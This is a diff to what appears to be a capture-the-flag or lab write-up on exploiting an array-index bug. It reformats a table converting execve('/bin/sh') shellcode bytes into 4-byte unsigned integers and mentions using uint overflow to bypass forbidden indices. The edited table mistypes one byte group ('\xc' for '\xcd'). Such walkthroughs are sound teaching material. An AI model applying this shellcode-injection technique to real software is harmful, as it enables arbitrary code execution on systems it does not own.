@@ -153,9 +153,12 @@ Runtime array address index: -36 / 4 = -9
 To put shellcode into the array we need to translate it into uints (each 4 bytes long):
 Shellcode for `execve("/bin/sh")` from [here](https://shell-storm.org/shellcode/files/shellcode-575.html): "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
 
-| hex      | \x6a\x0b\x58\x99  | \x52\x68\x2f\x2f  | \x73\x68\x68\x2f  | \x62\x69\x6e\x89  | \xe3\x31\xc9\xcd    | /x80  |
-| 4bytes   | 0x99580b6a        | 0x2f2f6852        | 0x2f686873        | 0x896e6962        | 0xcdc931e3          | 0x80 |
-| uint     | 2572684138        | 791636050         | 795371635         | 2305714530        | 3452514787          | 128  |
+
+| Format | Idx0             | Idx1             | Idx2             | Idx3             | Idx4            | Idx5 |
+|--------|------------------|------------------|------------------|------------------|-----------------|------|
+| hex    | \x6a\x0b\x58\x99 | \x52\x68\x2f\x2f | \x73\x68\x68\x2f | \x62\x69\x6e\x89 | \xe3\x31\xc9\xc | /x80 |
+| 4bytes | 0x99580b6a       | 0x2f2f6852       | 0x2f686873       | 0x896e6962       | 0xcdc931e3      | 0x80 |
+| uint   | 2572684138       | 791636050        | 795371635        | 2305714530       | 3452514787      | 128  |
 
 To put shellcode at the beginning indeces of the array (0-5) we need to get around forbidden ones (0, 3).
 For this we use uint overflow:
